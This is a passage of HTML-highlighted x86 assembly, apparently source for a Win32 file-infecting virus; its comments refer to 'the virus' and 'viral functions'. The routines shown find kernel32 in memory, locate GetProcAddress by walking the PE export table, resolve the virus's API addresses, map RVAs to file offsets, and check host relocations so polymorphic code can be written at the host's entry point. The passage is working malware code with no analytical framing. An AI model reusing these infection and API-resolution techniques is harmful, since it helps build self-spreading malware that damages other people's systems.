                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_raw</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">DH_lfanew</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">FH_NumberOfSections</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">err_RVA2RAW</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">FH_SizeOfOptionalHeader</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_FILE_HEADER</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

                </span><span class="sc1">;Get the IMAGE_SECTION_HEADER that contains RVA</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;At this point:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;ebx - File base address</span><span class="sc0">
                </span><span class="sc1">;esi - Pointer to IMAGE_OPTIONAL_HEADER</span><span class="sc0">
                </span><span class="sc1">;edi - Pointer to first section header</span><span class="sc0">
                </span><span class="sc1">;ecx - Number of sections</span><span class="sc0">

</span><span class="sc5">s_img_section</span><span class="sc4">:</span><span class="sc0">                  
                </span><span class="sc1">;Check if address of imports directory is inside this</span><span class="sc0">
                </span><span class="sc1">;section</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_raw</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">section_ok</span><span class="sc0">

</span><span class="sc5">out_of_section</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">;Go to next section header</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">s_img_section</span><span class="sc0">
</span><span class="sc5">err_RVA2RAW</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">section_ok</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc1">;Get raw</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Do needed relocation corrections over code at host entry-point</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">do_reloc_work</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;Entry:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;ebx - host base address</span><span class="sc0">
                </span><span class="sc1">;esi - IMAGE_BASE_RELOCATION</span><span class="sc0">
                </span><span class="sc1">;edi - IMAGE_OPTIONAL_HEADER</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;Exit:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;ecx - Space free of relocations at entry-point</span><span class="sc0">
                </span><span class="sc1">;      </span><span class="sc0">

                </span><span class="sc1">;Get IBR_VirtualAddress</span><span class="sc0">

                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">             

                </span><span class="sc1">;Get IBR_SizeOfBlock</span><span class="sc0">

                </span><span class="sc6">lodsd</span><span class="sc0">                   
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">continue_reloc</span><span class="sc0">

                </span><span class="sc1">;We have reached the last relocation and all of them</span><span class="sc0">
                </span><span class="sc1">;seem to refer to virtual addresses behind the host</span><span class="sc0">
                </span><span class="sc1">;entry-point, so we can generate lots of polymorphic</span><span class="sc0">
                </span><span class="sc1">;code there</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">continue_reloc</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">;Get number of relocations in this block</span><span class="sc0">
                                                        
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_BASE_RELOCATION</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">rblock_loop</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">;Get IBR_TypeOffset</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">lodsw</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0FFFh</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">OH_AddressOfEntryPoint</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">reloc_over_ep</span><span class="sc0">

</span><span class="sc5">next_reloc</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc1">;Follow relocations chain</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">rblock_loop</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">do_reloc_work</span><span class="sc0">

</span><span class="sc5">reloc_over_ep</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;Get number of bytes from entry-point to first relocation</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">OH_AddressOfEntryPoint</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
                       
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Get entry point for GetProcAddress</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">my_GetProcAddr</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;Entry:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;a_Kernel32 - Base address for kernel32</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;Exit:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;eax        - Entry point for GetProcAddress</span><span class="sc0">
                </span><span class="sc1">;             or NULL if error</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

                </span><span class="sc1">;Check for MZ signature at base address</span><span class="sc0">

                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_Kernel32</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc5">IMAGE_DOS_SIGNATURE</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">e_GetProcAddr</span><span class="sc0">

                </span><span class="sc1">;Now go to the pe header and check for the PE signature</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">IMAGE_DOS_HEADER.DH_lfanew</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">IMAGE_NT_SIGNATURE</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">e_GetProcAddr</span><span class="sc0">

                </span><span class="sc1">;Get pointer to Image Export Directory and save it</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">NT_OptionalHeader.</span><span class="sc0">      \
                        </span><span class="sc5">OH_DirectoryEntries.</span><span class="sc0">    \
                        </span><span class="sc5">DE_Export.</span><span class="sc0">              \
                        </span><span class="sc5">DD_VirtualAddress</span><span class="sc4">-</span><span class="sc2">0004h</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">;Get pointer to exported function names</span><span class="sc0">
                </span><span class="sc1">;Also follow the AddressOfNameOrdinals array</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">ED_NumberOfNames</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">ED_AddressOfNameOrdinals</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">ED_AddressOfNames</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                

</span><span class="sc5">next_name</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">;Search for GetProcAddress in exported function names</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">szGetProcAddr</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">try_next</span><span class="sc0">

</span><span class="sc5">got_name_rva</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;Get absolute address</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

                </span><span class="sc1">;Compare names</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0000000Eh</span><span class="sc0">
                </span><span class="sc6">repe</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">found_name</span><span class="sc0">

</span><span class="sc5">try_next</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">;Go to next name</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">00000002h</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">next_name</span><span class="sc0">
                
                </span><span class="sc1">;Name not found, exit with error</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">e_GetProcAddr</span><span class="sc0">

</span><span class="sc5">found_name</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc1">;Ok, now edx is the index of the function, so</span><span class="sc0">
                </span><span class="sc1">;lets look at AddressOfNameOrdinals using that index</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

                </span><span class="sc1">;Get ordinal for function</span><span class="sc0">

                </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Check if ordinal out of range</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">ED_NumberOfFunctions</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">e_GetProcAddr</span><span class="sc0">

                </span><span class="sc1">;This is the starting export ordinal number</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">ED_BaseOrdinal</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">

                </span><span class="sc1">;Get address of function</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">ED_AddressOfFunctions</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">e_GetProcAddr</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;GetProcAddress not found, exit with error</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Get KERNEL32 module handle if we cant get it using GetModuleHandle</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">my_getkernel</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;Get KERNEL32 base address using the ID_ForwarderChain</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;Entry:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;ebx - Base address of host in memory</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;Exit:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;eax - Kernel32 base address or NULL if error</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc1">;Generate a mov esi,xxxx instruction</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0BEh</span><span class="sc0">

                </span><span class="sc1">;This is just a rva that points to ID_ForwarderChain</span><span class="sc0">
                </span><span class="sc1">;field inside Kernel32 import module descriptor</span><span class="sc0">

</span><span class="sc5">rva_kernel32</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

                </span><span class="sc1">;Get Kernel32 entry point from ID_ForwarderChain</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">

                </span><span class="sc1">;Check for the MZ signature</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc5">IMAGE_DOS_SIGNATURE</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">err_getkernel</span><span class="sc0">

                </span><span class="sc1">;Now go to the pe header and check for the PE signature</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">DH_lfanew</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc5">IMAGE_NT_SIGNATURE</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">err_getkernel</span><span class="sc0">

                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">err_getkernel</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;Could not find KERNEL32 base addres :(</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Get APIs entry point</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">get_functions</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;Get the entry point for all KERNEL32 API functions</span><span class="sc0">
                </span><span class="sc1">;used by the virus</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;Entry:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;None</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;Exit:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;ecx - NULL if error</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc1">;Dont fuck our host base address</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

                </span><span class="sc1">;Get pointer to viral function names</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">viral_functions</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">viral_addresses</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Get number of functions</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">viral_tbl_end</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">viral_functions</span><span class="sc4">)/</span><span class="sc2">04h</span><span class="sc0">

</span><span class="sc5">get_each_ep</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">;Get pointer to function name</span><span class="sc0">

                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">

                </span><span class="sc1">;Save counter and pointers</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

                </span><span class="sc1">;Get entry point using GetProcAddress</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_Kernel32</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_GetProcAddr</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Restore counter and pointers</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

                </span><span class="sc1">;Check if entry point is valid</span><span class="sc0">

                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">exit_get_func</span><span class="sc0">

                </span><span class="sc1">;Save function entry point</span><span class="sc0">

                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">

                </span><span class="sc1">;Next function</span><span class="sc0">

                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">get_each_ep</span><span class="sc0">

</span><span class="sc5">exit_get_func</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;Return, eax contains last function entry point or NULL</span><span class="sc0">
                </span><span class="sc1">;if error</span><span class="sc0">

